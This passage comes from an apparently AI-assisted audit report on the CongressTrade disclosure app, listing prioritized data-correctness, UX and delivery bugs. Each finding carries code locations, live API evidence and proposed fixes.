- **Where:** clients/ios/CongressTrade/Views/TrendsView.swift:970-1006 (line numbers may have shifted with iOS diff churn since cd30d4b9; not independently re-line-checked)  ·  **Surface:** iOS  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Sorting descending by signed value and truncating guarantees the biggest outflows are hidden in the aggregate row, while tiny rows (Real Estate −$8k) get a slot.
- **Impact:** iOS users see a misleading sector picture and a giant unexplained 'Other'.
- **Fix:** Rank by |net flow| (or by est. volume) before taking top-N, and never fold a sector whose |net| exceeds any shown row; match web ordering.
- **Evidence:** 21-trends-scroll-04.png: rows Technology +$3.1m … Basic Materials −$24k, then 'Other (7 sectors) −$16.3m'. API: Energy 26 trades net −15,548,002 (Alan Armstrong WMB $5m–$25m sale). TrendsView.swift@origin/main:970-1006 `.sorted { ($0.netFlow ?? 0) > ($1.netFlow ?? 0) }` then `named.prefix(topCount)` → the most negative sectors always land in 'Other'. Web shows Energy as its own row (trends-full.png).
- **Panel:** data-correctness — Confirmed at code level: TrendsView.swift:982 sorts descending by signed netFlow, :991 takes prefix(topCount), :1005 labels the remainder 'Other (N sectors)'.  Live /api/analytics/sector-flow?window=90d confirms Energy is currently the most negative sector at −$15,548,002, which under this sort/truncate logic would still be folded into Other today. · merged: ios-shipped-app/IOSSHIPPEDAPP-12 · `data-correctness/DATACORRECTNESS-12`

#### 70. [P2] Free-text strings stored in the ticker column ('MUNICIPAL-SECURITY', 'PART OF MY SPOUSE'S RETIREMENT PORTFOLIO.') count as resolved assets

- **Where:** app/src/analytics/sql.ts:208 (drifted from cited 180; content identical — still only excludes 'NONE','--','N/A','NA','NULL','—')  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Placeholder and asset-name strings pass the 'resolved ticker' test, so they inflate unique-asset counts, appear as openable 'companies', and dilute resolved-ticker percentages.
- **Impact:** Directory Assets and all-time KPIs are polluted; a 'MUNICIPAL-SECURITY' drawer offers a backtest/company block for a non-security.
- **Fix:** Tighten TICKER_RESOLVED_SQL (regex-like: length ≤ 10, no spaces, not in a placeholder list) or add an `is_ticker` flag populated at ingest; move placeholders to asset_name.
- **Evidence:** /api/assets: 645 of 4,160 'tickers' fail a ticker regex; MUNICIPAL-SECURITY 529 trades/39 members, 'US TREASURY BILLS' 52, 'CORPORATE-BOND' 38, 'NON-PUBLIC-STOCK' 31, 'VIRTUAL CURRENCY' 22, 'DIVIDEND REINVESTMENT' 7, 'HEDGE FUND. FUND MANAGER LETTER ON FILE WITH THE COMMITTEE ON ETHICS.' 7; 852 assets have no name. ticker-leaderboard?window=all lists MUNICIPAL-SECURITY 529. sql.ts:180 TICKER_RESOLVED_SQL only excludes 'NONE','--','N/A','NA','NULL','—'.
- **Panel:** data-correctness — Reproduced live 2026-08-19: /api/analytics/ticker-leaderboard?window=all&sort=trades lists MUNICIPAL-SECURITY tradeCount:529, memberCount:39 — exact match.  TICKER_RESOLVED_SQL confirmed at sql.ts:208 in origin/main (line number drifted slightly from the raw finding's 180 due to intervening edits, content identical: only excludes 'NONE','--','N/A','NA','NULL','—'). · merged: ios-shipped-app/IOSSHIPPEDAPP-25 · `data-correctness/DATACORRECTNESS-14`

#### 71. [P2] 'Past Day' and 'Past Week' windows are structurally empty and 'Past Month' excludes trades disclosed this month

- **Where:** app/src/analytics/sql.ts:264-278 (line numbers approximate, content unchanged); app/src/ui/dashboardHtml.ts (TR_WINDOW_LABELS, line drifted from 9314)  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Because every window filters on execution date and disclosures lag 1–45 days, the two shortest presets can never show data and the monthly view hides the freshest filings.
- **Impact:** Users picking 'Past Week' see an empty dashboard and conclude nothing was traded/disclosed.
- **Fix:** Drop 1d/7d from Trends, or offer a 'Disclosed in last N days' basis (filter on COALESCE(f.filed_date, f.first_seen_at)) and label which basis is active; show an empty-state explaining the lag.
- **Evidence:** summary?window=1d → 0 trades; 7d → 0; 30d → 127. /api/transactions?sort=published&order=desc: newest rows are Boozman trades tx 2026-07-02 filed 2026-08-17 — outside 'Past Month' by trade date. sql.ts:264-278 window applies to t.tx_date only; dashboardHtml.ts@origin/main:9314 labels '1d' 'Past Day', '7d' 'Past Week'. #1978 P1-E flags the trade-date vs disclosure-window semantics generally; this is the concrete dead-preset consequence.
- **Panel:** data-correctness — Reproduced live 2026-08-19: summary?window=1d totalTrades:0 (confirmed empty); window=7d totalTrades:1 (raw finding said 0 — off by one row today, but the preset is still effectively/structurally empty as described); window=30d totalTrades:130.  TR_WINDOW_LABELS and window-applies-to-tx_date confirmed in sql.ts:271-280 and dashboardHtml.ts. · `data-correctness/DATACORRECTNESS-17`

#### 72. [P2] Rising Activity semantics are unlabeled and partly wrong: '0 → 13' is prior-window vs current-window, `last_cy` compares trailing 365d, 'All Time' compares 90d

- **Where:** app/src/analytics/builders.ts:215-224 (drifted slightly from cited 215-218/226-270)  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** The card never says what the two numbers are or what the prior period is, and for calendar/all windows the comparison period contradicts the selected window.
- **Impact:** Readers can't interpret '0 → 13'; under Last Calendar Year / All Time the ranking is computed on a different period than labeled.
- **Fix:** Caption 'prior 3 mo → past 3 mo'; make momentumOffsets calendar-aware (last_cy = Jan 1–Dec 31 vs prior year) and explicit for 'all'; restrict to B/S; consider ranking by delta with a min prior or by % change with floor.
- **Evidence:** dashboardHtml.ts@origin/main:10581 renders `priorCount + ' → ' + recentCount` under a bare 'Trades' header with no period caption. builders.ts:215-218 momentumOffsets: `windowDays(w) ?? 90` → for 'all' a 90d-vs-prior-90d comparison under an 'All Time' header; for 'last_cy' windowDays=365 → recent = date('now','-365 days') (trailing year, overlapping this year) rather than the calendar year the header promises; buildTrendingQuery (:226-270) counts all tx types incl. exchanges and ranks by absolute delta. BEP '0 → 13' is Salazar ×(primary+competitor) + phantom 'Maria Elvira' (see -01/-03).
- **Panel:** data-correctness — Confirmed at code level in origin/main builders.ts:215-224: `momentumOffsets` falls back to 90 days for 'all' and windowDays('last_cy')=365 produces a rolling trailing-year window rather than a calendar-year window, exactly as described.  Did not independently re-derive a live '0→13' example, but the code logic is unambiguous and unchanged. · `data-correctness/DATACORRECTNESS-18`

#### 73. [P2] /member/:id/performance does not resolve bioguide ids, so the same politician shows empty performance when opened by ?member=P000197 and populated via slug

- **Where:** app/src/analytics/routes.ts:1049-1050 (/member/:filerId, resolveMember) vs 1151-1161 (/member/:filerId/performance, no remap) — line numbers approximate, logic unchanged  ·  **Surface:** Web  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** new
- **What:** Only the profile endpoint remaps official bioguide ids to the slug filer id used in transactions; the performance endpoint queries the raw id and returns an empty leg.
- **Impact:** Deep links / Trends taps by bioguide show 'No priced equity buys to score yet' for members who do have scores.
- **Fix:** Apply the same resolveMember remap (and cache key) in the performance route; add a route test with a bioguide id.
- **Evidence:** curl /api/analytics/member/P000197/performance → buyCount 0, all null; /member/house-ca11-nancy-pelosi/performance → buyCount 4, scored 2. routes.ts:1049-1050 (/member/:filerId) calls `resolveMember(c.env, filerId)`; routes.ts:1151-1161 (/member/:filerId/performance) uses `filerId` directly (`buildMemberPerformanceQuery(filerId, f)`). Capture NOTES (h)4. Not in PR #1973's parity matrix body.
- **Panel:** data-correctness — Reproduced live 2026-08-19: curl /api/analytics/member/P000197/performance returns buyCount:0 and every stat null across tradeDate/filingDate/performance; curl /api/analytics/member/house-ca11-nancy-pelosi/performance (same real person, slug id) returns buyCount:124, winRate:0.575, scoredCount:80.  Exact confirmation of the bioguide-vs-slug resolution gap (buyCount differs from the raw finding's cited '4' because my query used the default window='all' rather than 90d; the bug itself is identical). · merged: qa-bughunt/QABUGHUNT-08, web-ux-desktop/WEBUXDESKTOP-13 · `data-correctness/DATACORRECTNESS-19`

#### 74. [P2] Ticker drawer backtest inherits the Trends window, so it shows 'n<5' everywhere and a misleading 'price cache backfills' excuse

- **Where:** app/src/ui/dashboardHtml.ts:11169; app/src/analytics/routes.ts:838 (drifted from cited 823)  ·  **Surface:** Web  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** A forward-return backtest is evaluated on a trailing-90-day buy cohort, which by construction has almost no matured horizons, and the placeholder blames the price cache.
- **Impact:** The section is effectively always empty in the default view and misinforms about why.
- **Fix:** Call the backtest with window=all (cohort = all disclosed buys) and say so; keep the Trends window for the activity tiles only; change the empty-state copy to the real reason.
- **Evidence:** dashboardHtml.ts@origin/main:11169 `aGet('ticker/…/backtest?' + trParams())` (window=90d default) vs routes.ts:823 backtest default window 'all'. curl backtest NVDA window=90d cohort 4 → all horizons null; window=all → 333 buys, n=333/329/319/283. Empty-state copy (:11184) 'No priced equity buys to score yet — this fills in as the price cache backfills' fires when the windowed cohort is 0, not when prices are missing. Forward horizons (21–252 trading days) can never mature inside a 90-day cohort anyway.
- **Panel:** data-correctness — Reproduced live 2026-08-19: curl /api/analytics/ticker/NVDA/backtest?window=90d → totalBuyEvents:4, n:4 for the 21d horizon only, n:0 (null stats) for 63/126/252d; curl …?window=all → totalBuyEvents:333, n:333/329/319/… across horizons. dashboardHtml.ts:11169 confirmed calling the endpoint with trParams() (the Trends window) rather than window=all; routes.ts:838 confirmed the endpoint's own default is 'all', meaning the frontend is overriding a sensible server default with a bad one. · `data-correctness/DATACORRECTNESS-20`

#### 85. [P2] Headline Net Flow +$8.2m contradicts sector/market-cap breakdowns that both sum to about −$11.0m, with no on-screen scope note

- **Where:** clients/ios/CongressTrade/Views/TrendsView.swift:185-206,449-480  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** (was IOSSHIP-13) Breakdowns cover ticker-resolved trades only while the headline covers everything; nothing on screen says so.
- **Impact:** A careful reader concludes the numbers are wrong.
- **Fix:** Caption the breakdown cards 'Covers N of M trades with a mapped ticker' (both counts are in the payloads) or compute the headline on the same basis.
- **Evidence:** summary?window=90d: estimatedNetFlowUsd 8,246,634 over 2,178 trades; sector-flow sums −11,093,232 over 859 trades (my curl 2026-08-19); walkthrough market-cap sums −10,957,726 over 911 trades.
- **Panel:** ios-shipped-app — Live check: summary?window=90d estimatedNetFlowUsd +8,199,633 over 2,190 trades vs sector-flow sum -11,215,234 over 870 trades — confirms the headline and breakdown cover materially different trade populations with opposite sign, no on-screen scope note in the cited TrendsView code. · `ios-shipped-app/IOSSHIPPEDAPP-13`

#### 153. [P2] text_pdf extractor's last-row boundary bug pollutes supplementalText/location/rawText with unrelated document-footer, certification, and signature-block text on every text_pdf filing

- **Where:** app/src/extraction/textPdf.ts:212-233 (parseInlineRecords), :381-388 (parseHouseRowDetails) — unchanged, no line shift  ·  **Surface:** Backend  ·  **Category:** extraction-accuracy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Core financial fields (ticker, txDate, txType, amount bracket) were correct in all 3 cases -- this bug does not corrupt the trade itself.  It corrupts the auxiliary `location`, `description`, `supplementalText`, and `rawText` fields, which are returned verbatim on the public `/api/transactions` and `/api/filings/:docId` JSON endpoints (delivery/rows.ts:186,188) and are also what admins see/edit in the review-queue consensus UI (dashboardHtml.ts CONSENSUS_FIELD_ORDER/CONSENSUS_FIELD_LABEL, ~line 5927-5936).  Because it fires on the LAST parsed row of every text_pdf filing (single-row filings are 100% affected since their only row is also the last), this is systematic, not an edge case.
- **Impact:** Not currently visible to end users (the web dashboard's consumer-facing trade cards and the iOS client do not render supplementalText/location; the Premium CSV export also omits these columns), but it is live, public, structured API data that misrepresents what a filer actually wrote as a comment on that specific transaction -- a real filer note ('Transactions are initiated... no input from Rep.  Kean') is buried inside garbage, and a future feature (search, CSV column addition, admin trust in the field) inherits corrupted data.
- **Fix:** Bound the final row's slice to a document-structure marker instead of end-of-string: stop at the first occurrence of a known footer marker ('* For the complete list of asset type', 'CERTIFICATION AND SIGNATURE', 'I CERTIFY that', 'Digitally Signed:'), or reuse the existing looksLikeHeaderContaminatedAsset regex family to truncate rawText before running parseHouseRowDetails on it.  One-line fix at textPdf.ts:215 plus a truncation helper; add a regression test asserting the last row of a multi-row and a single-row fixture has null/clean location+supplementalText.
- **Evidence:** textPdf.ts:215: `const rawText = normalized.slice(m.index, next ? next.index : undefined).trim();` -- for the LAST regex match in a filing, `next` is undefined so the slice runs to the end of the ENTIRE normalized document text (past the transaction table, through 'Investment Vehicle Details', 'Initial Public Offerings', 'Certification and Signature', and the digital-signature line), not just to the end of that row. Reproduced in 3/3 sampled text_pdf filings' final row: (1) H-2026-20035260 (Rep. Richard Allen) -- Broadcom row's `location`/`supplementalText` (`curl https://congress.trade/api/filings/H-2026-20035260`) contains 'US I P O Yes No C S I CERTIFY that the statements I have made on the attached Periodic Transaction Report are true, complete, and correct to the best of Filing ID #20035260 my knowledge and belief... Digitally Signed: Hon. Richard W. Allen, 08/18/2026' -- verified against the source PDF, which correctly has no such text associated with that row. (2) H-2026-20035273 (Rep. Thomas Kean) -- Alphabet/GOOGL row's location/supplementalText is 'US State Street Bank & Trust Co. C Transactions are initiated and made by third party advisors with no input from Rep. Kean. I P O Yes No C S I CERTIFY that the statements I have made on the attached...' (the real disclosed comment about a blind-trust-style advisor is present but glued to ~150 chars of unrelated footer boilerplate). (3) H-2026-20035275 (Rep. Ed Case) -- Apple row's supplementalText is 'Automatic stock dividend reinvestment. * For the complete list of asset type abbreviations, please visit https://fd.house.gov/reference/asset-type-codes.aspx. I P O Yes No C S I CERTIFY...'.
- **Panel:** gap-extraction-ground-truth-audit — Verified by direct field comparison against the live JSON API for 3 independent docIds; the code path (textPdf.ts:215) fully explains the observed behavior and matches 100% of the length/content pattern seen (trailing document boilerplate). · `gap-extraction-ground-truth-audit/GAPEXTRACTIONGROUNDTRUTHAUDIT-03`

#### 157. [P2] 'Unknown' is the largest asset type (51% of trades, 55% of $) because manual/local_mac rows lack asset_type even when the ticker resolves to equity; bond rows show '0 assets'

- **Where:** unchanged  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Asset-type classification relies solely on the extracted asset_type code; newer extraction paths leave it empty, so the taxonomy chart is mostly 'Unknown', and the 'assets' count is meaningless for non-tickered classes.
- **Impact:** The By Asset Type card says almost nothing; public-equity share of volume is understated.
- **Fix:** Fallback in canonicalAssetTypeCategorySql: if asset_type empty and securities_ref.asset_class = 'equity'/'etf' → public_equity/fund; backfill asset_type for manual/local_mac rows; relabel 'assets' as 'tickers' or count distinct asset names for bonds.
- **Evidence:** sector-breakdown?window=90d: Unknown 1,121 trades / $53.8m vs Public Equity 860 / $9.4m. Feed sample: assetTypeCategory 'unknown' for 354/436 manual and 181/191 local_mac rows; raw asset_type None for 660/1,250 rows. MSFT row via /api/client/v1/ticker/MSFT: `typeCategory: 'unknown'` with `assetClass: 'equity'` from securities_ref. Card shows 'Government / Municipal Debt … 0 assets' because unique_tickers counts resolved tickers only (builders.ts:345).
- **Panel:** data-correctness — Reproduced live 2026-08-19: /api/analytics/sector-breakdown?window=90d shows Unknown 1,127 trades / $53,956,747 vs Public Equity 865 / $9,498,933 (1127/2190=51.5% of trades, $53.9m/$97.7m≈55% of $) — matches the raw finding's proportions closely, and Government/Municipal Debt row shows uniqueTickers:0 exactly as described. · `data-correctness/DATACORRECTNESS-13`

#### 158. [P2] Latency scoreboard counts one race per transaction row, so one multi-row filing reads as '10/10 wins, 24.1h lead'

- **Where:** app/src/ingestion/tradeLatency.ts:2356 (generateTradeHash)  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** The sample size shown to users is transaction rows, so a single PTR with ten lines satisfies the 'preliminary' threshold and yields a 100% win rate.
- **Impact:** Speed claims are statistically n≈1 while displayed as 10 matched races.
- **Fix:** Aggregate races per (doc_id, provider) for headline counts/percentiles (or weight by 1/rows-per-doc), show 'N filings', and require ≥N distinct filings for 'preliminary'.
- **Evidence:** /api/analytics/latency-summary: FMP matched 10, usFirstCount 10, medianLeadSec = avgLeadSec = p90LeadSec = 86,630 — three identical statistics are only possible if all 10 deltas are identical, i.e. 10 transactions from the same filing raced against the same provider batch. tradeLatency.ts@origin/main:2338-2356 mints a candidate per `tx` (trade_hash per transaction), not per doc_id; `preliminary` needs only ≥2 timed races.
- **Panel:** data-correctness — Confirmed at code level: tradeLatency.ts:2356 `generateTradeHash(filerName, tx.ticker, tx.txDate, tx.txType)` mints one candidate per (filer, ticker, date, side) combination, i.e. per distinct security line in a filing, not per doc_id — so a multi-security PTR filed/observed on the same day produces N races with identical lead times, exactly the mechanism described.  Live /api/analytics/latency-summary today shows FMP matched:12, medianLeadSec:86630, avgLeadSec:74652 (no longer three identical numbers, because the specific sample composition has shifted since the raw finding's capture, and the code appears to have added weak/strong match distinctions since then).  The design flaw itself — same-day multi-line filings inflating race counts — is unchanged and reproducible any time such a filing is ingested. · `data-correctness/DATACORRECTNESS-16`

#### 167. [P2] Asset display names still unnormalized ("… CMN", "Rate/Coupon: … Matures: …", suspect HONAV ticker)

- **Where:** Trades table asset column (Trends Largest Buys section removed by PR #2020)  ·  **Surface:** Web  ·  **Category:** data-correctness  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-08-06 (issue #1453; ux-findings §5 2026-08-10)
- **What:** #1453 and ux-findings §5 asked for asset-name normalization (strip footnote brackets, move rate/maturity into Notes, resolve 'UNH Stock'/'CMN' suffixes) and a dry-run backfill.  Names on the live default view are still raw.
- **Impact:** Grouping by asset splits the same security across variants; the table reads like a raw scrape.
- **Fix:** Land the rigid-suffix Rate/Coupon→note parser and CMN/'Common Stock' stripping in normalizer + a one-time backfill (dry-run report first, per ux-findings §5); investigate HONAV → HON.
- **Evidence:** Live API sample (250 rows returned despite limit=500): 94 of 250 assetName values match /CMN|Rate\/Coupon|Matures:/ (e.g. 'Chewy Inc. CMN Class A', 'Ge Healthcare Technologies Inc. CMN', 'Hasbro Inc. Note Rate/Coupon: 3.55% Matures: 2026-11-19'), 120 of 250 rows have no ticker. .review-shots/web/mobile/trends.png and desktop/trends-a11y.txt:84 both show 'HONAV Honeywell Aerospace Inc.' as a live ticker/asset row in Largest Buys. app/scripts/dry-run-asset-name-cleanup.ts exists (14,548 bytes, last touched 2026-08-11) but no backfill has landed — the junk names are still live.
- **Panel:** prior-review-followup — Reproduced live junk-name rate and HONAV ticker via screenshot + a11y tree.  Percentages hold at the same order of magnitude even though the live endpoint returned 250 rows, not 500. · merged: ios-shipped-app/IOSSHIPPEDAPP-24 · `prior-review-followup/PRIORREVIEWFOLLOWUP-02`

#### 218. [P3] Timestamps are rendered in UTC with no timezone label ('SEEN Jul 30, 2026 · 3:32pm' is 15:32Z)

- **Where:** app/src/ui/dashboardHtml.ts:3959 (drifted from unspecified original line; content/regex identical)  ·  **Surface:** Web  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Clock times are shown as if local but are UTC, and dates can be off by one relative to the viewer's day.
- **Impact:** Latency/discovery times are misread by 5–7 hours; 'Imported Aug 11' vs user's Aug 10 evening.
- **Fix:** Format via Date + toLocale*(…, {timeZoneName:'short'}) or append 'UTC'; keep dates in the viewer's zone consistently.
- **Evidence:** trades-row-expanded-a11y.txt SEEN 'Jul 30, 2026 · 3:32pm'; API firstSeenAt 2026-07-30T15:32:12.565Z. dashboardHtml.ts@origin/main timeText() regex-parses the ISO hour (`/(?:T|\s)(\d{2}):(\d{2})/`) and dateText() takes the UTC date part, so a 03:06Z import shows as the next day's date for US viewers.
- **Panel:** data-correctness — Confirmed at code level in origin/main dashboardHtml.ts:3959 `timeText()`: regex-extracts the ISO string's hour/minute directly (`/(?:T|\s)(\d{2}):(\d{2})/`) with no Date object, no timezone conversion, and no 'UTC' suffix — renders the raw UTC clock time as if local, exactly as described. · merged: qa-bughunt/QABUGHUNT-12 · `data-correctness/DATACORRECTNESS-21`

#### 219. [P3] Disclosure Timeliness tile labelled 'Disclosures 1,656' counts trade rows (incl. manual+primary duplicates), and '>45 day lag 1%' is 0.66% rounded up

- **Where:** app/src/analytics/builders.ts:577-583 (drifted from cited 569-583)  ·  **Surface:** Web  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The tile overstates what it is (filings) and rounds a sub-1% share to 1%; the histogram and Slowest Filers double-count duplicated rows.
- **Impact:** Minor misreads of the accountability lens; Slowest Filers averages and late counts skewed by duplicates.
- **Fix:** Label 'Trade rows with both dates'; show one decimal under 10%; compute lag per distinct (doc_id, tx) after dedupe.
- **Evidence:** filing-lag?window=90d: count 1,656, overFortyFivePct 0.0066, distribution 46-59d 11 / 60d+ 0. Web tile reads '>45 DAY LAG 1 %' and 'DISCLOSURES 1,656'; :3028 title says 'Counts trade rows'. Duplicate docs (Fleischmann H-2026-9116212 manual+primary) enter the histogram twice (builders.ts:569-583 groups transactions, not filings). #1978 P1-F covers the missing denominator; this is the label/rounding/duplicate overlay.
- **Panel:** data-correctness — Reproduced live 2026-08-19: curl /api/analytics/filing-lag?window=90d returns count:1656 (exact match), overFortyFivePct:0.0066 (exact match), distribution 46-59d:11 / 60d+:0 (exact match). buildFilingLagHistogramQuery confirmed at builders.ts:577-583 groups on t.tx_date/f.filed_date per transaction row with no dedup, consistent with -01. · `data-correctness/DATACORRECTNESS-22`

#### 220. [P3] Bracket floors are inconsistent across sources (1000 vs 1001) and mis-parsed amounts fall into the open-top 'floor' path

- **Where:** unchanged (app/src/analytics/sql.ts, BRACKET_MIDPOINT_SQL fallback ~186-187)  ·  **Surface:** Backend  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** plausible (high confidence)
- **What:** Bracket normalization is not enforced at ingest, so identical brackets carry different bounds and a parse error (share count in amount_min) is silently accepted as a dollar floor.
- **Impact:** Small $ errors; breaks exact-match dedupe and minAmount filtering; nonsensical '$15' exchange value.
- **Fix:** Normalize to the canonical STOCK Act tier table at ingest (snap 1000→1001 etc.), reject/flag amount_min that is not a tier floor, and null amounts that don't map.
- **Evidence:** Feed sample: 51 of 436 manual rows have (1000, 15000) vs the standard (1001, 15000); Fleischmann TSCO manual row amount_min 1000 vs primary 1001 for the same trade. Pelosi VSNT exchange 2026-01-02: amountMin 15, amountMax None → sql.ts:157-159 treats 15 as an open-top floor ($15 'est.'). iOS/web show '$1k - $15k' for both 1000 and 1001 so dedupe keys/filters on amount_min diverge.
- **Panel:** data-correctness — Partially reproduced: live /api/analytics/ticker/TSCO?window=90d does show the Fleischmann manual row with amountMin:1000 alongside a primary/competitor twin at amountMin:1001 for the identical trade (H-2026-9116212, 2026-06-09), confirming the '1000 vs 1001' bracket-floor inconsistency.  Did not independently verify the separate 'Pelosi VSNT $15 open-top floor' parse-error claim or re-derive the 51/436 ratio — the BRACKET_MIDPOINT_SQL fallback-to-amount_min logic (sql.ts:186-187) is confirmed and does behave as described for any small stray amount_min, so the mechanism is sound even though I couldn't independently spot-check that specific VSNT row. · `data-correctness/DATACORRECTNESS-23`

#### 221. [P3] iOS omits the estimate marker on Est. Volume and uses different rounding than web; Buys/Sells tiles don't reconcile to Trades

- **Where:** clients/ios/CongressTrade/Views/Components/Components.swift:255-274 (line numbers may have shifted with iOS diff churn since cd30d4b9)  ·  **Surface:** iOS  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Cross-platform presentation of the same estimates differs in precision and caveat, and the iOS count tiles silently drop exchanges.
- **Impact:** Readers comparing web and app see 'different' numbers; estimate caveat missing on iOS.
- **Fix:** Share one rounding rule (0 decimals ≥ $10k) and the '~'/info tip on iOS; add an Exchanges count or footnote so tiles sum to Trades.
- **Evidence:** iOS 'Est. Volume $97.4m' (no '~', no 'not exact' tip) vs web '~$97.4m' with EST_VOLUME_TIP; iOS GOOGL '$144.5k', SPCX '$378.5k', BEP '$128.5k' vs web '~$145k', '~$379k', '~$129k' (usdC toFixed(0) ≥1e4 at dashboardHtml@origin/main:9348-9356; CompactFormat.usd keeps one decimal). iOS tiles Buys 1,439 + Sells 726 = 2,165 ≠ Trades 2,178 (13 exchanges not shown); web shows '66% buys' instead.
- **Panel:** data-correctness — Confirmed the core claim at code level: iOS Components.swift:255-274 `CompactFormat.usd` never prepends '~' or any estimate caveat, while dashboardHtml.ts's `estUsd()` wraps every value in a '~' prefix plus a title tooltip (EST_VOLUME_TIP) — a real, unconditional cross-platform inconsistency.  Also confirmed iOS CompactFormat.usd keeps one decimal at the k/m/b tiers (`compactNumber`) where web's usdC() drops to 0 decimals ≥ $10k, so the exact-rounding-mismatch claim is plausible from the formatting logic, though I did not independently pull live iOS screen values to confirm the specific $144.5k/$379k/$128.5k examples.  Did not verify the Buys+Sells-vs-Trades reconciliation gap on a live iOS screen; the 13-exchange-count arithmetic ($2178-2165=13$) is internally consistent with the exchangeCount:13 returned by the live summary endpoint today, so it is plausible. · `data-correctness/DATACORRECTNESS-24`

#### 320. [P3] Committee data missing for prominent members ('Committees: Not recorded' for Pelosi) — 9 of top-40 filers empty

- **Where:** Member drawer → Committees; /api/analytics/member/:id profile.committees  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-08-06 (#1460 OPEN, #1458)
- **What:** #1458/#1460 (2026-08-06) flagged 'Committees Not recorded'.  Coverage is partial and the directory list can't show committees.
- **Impact:** Committee Sector Conflicts (a flagship view) silently under-reports for members without committee rows.
- **Fix:** Re-run/extend app/scripts/hoard_committees.ts for the gap list, add committees to /api/members, and change the empty copy to 'No committee data yet'.
- **Evidence:** curl /api/analytics/member/house-ca11-nancy-pelosi → `"committees": []`; curl /api/members?limit=5 confirms the member list exposes only {filerId, fullName, chamber, party, state, district, txCount, photoUrl, title} — no committees field at all.
- **Panel:** prior-review-followup — Live curl confirms Pelosi profile.committees is an empty array and /api/members omits the field entirely, matching the finding's field-list claim exactly.  Did not re-sample all 40 top filers (spot check only) but the mechanism (empty array is possible and API has no committees field) is directly confirmed. · `prior-review-followup/PRIORREVIEWFOLLOWUP-16`

#### 383. [P4] Consensus Moves empty-state still tells users to try “All Data”, a toggle that was removed

- **Where:** Trends → Consensus Moves empty state  ·  **Surface:** Web  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Stale copy references a control that no longer exists.
- **Impact:** Confusing guidance when the card is empty (e.g., short windows).
- **Fix:** Change to 'try a longer window'.
- **Evidence:** dashboardHtml.ts@origin/main:10596 'No multi-politician consensus in this window — try a longer window or “All Data”.'; :3503-3509 tradesSourceMode comment: the Primary Only / All Data toggle was removed.
- **Panel:** data-correctness — Confirmed verbatim in origin/main dashboardHtml.ts:10593 (line number drifted by 3 from the raw finding's 10596, text identical): 'No multi-politician consensus in this window — try a longer window or “All Data”.' tradesSourceMode() comment at :3505-3507 confirms the toggle it references was removed. · `data-correctness/DATACORRECTNESS-26`

### Delivery and alerts: the paid feature does not deliver (29)

The one-time webhook secret is never shown, the APNs query throws on every tick, member filters can never match, and quarantined events are dropped permanently.  The $5/mo promise is largely unredeemable today.

#### 3. [P0] APNs fan-out SQL joins `filers f ON f.id` but filers has no `id` column → every push tick throws

- **Where:** app/src/delivery/apnsFanout.ts  ·  **Surface:** Backend  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** The official-trade query in fanOutApnsProductEvents references a non-existent column.  Once APNs is configured and ≥1 device is registered, the lane fails every tick before any trade or review push is sent, and state is never advanced.
- **Impact:** iOS push alerts — the one 'alert on this phone' product — cannot deliver anything.  The iOS toggle reports 'on — new disclosures alert this device' (DeliveryView.swift:398 area) while nothing arrives.
- **Fix:** Change the join to `LEFT JOIN filers f ON f.bioguide_id = t.filer_id` (and prefer COALESCE(display_name, full_name), which the code already does).  Add a test that runs the real SQL against an in-memory SQLite with the migrations applied, and surface apns_fanout lane errors in /api/admin/diagnostics.
- **Evidence:** app/src/delivery/apnsFanout.ts:157-158 `LEFT JOIN filers f ON f.id = t.filer_id`. Schema: app/migrations/0001_init.sql:5-13 `CREATE TABLE filers (bioguide_id TEXT PRIMARY KEY, chamber, full_name, party, state, district, committees)` — no `id`. Confirmed no later migration adds one (0002/0066/0078/0083 only add photo_url/resolved_bioguide_id/merged_into/display_name). Every other filers join uses `fl.bioguide_id = t.filer_id` (outbox.ts:163, sse.ts:541). The test file (apnsFanout.test.ts) stubs `env.DB.prepare` directly with a fake statement object, so the literal SQL string is never parsed/executed by real SQLite in CI.
- **Panel:** delivery-alerts — Line numbers shifted slightly (157-158 vs the raw finding's 152-164, presumably due to file drift) but the exact bug is present verbatim: `f.id = t.filer_id` against a `filers` table whose only key is `bioguide_id`.  This will throw 'no such column: f.id' the instant the query runs against real D1/SQLite. · `delivery-alerts/DELIVERYALERTS-02`

#### 4. [P0] One-time delivery secret is never shown: inline command success skips the claim on web and iOS

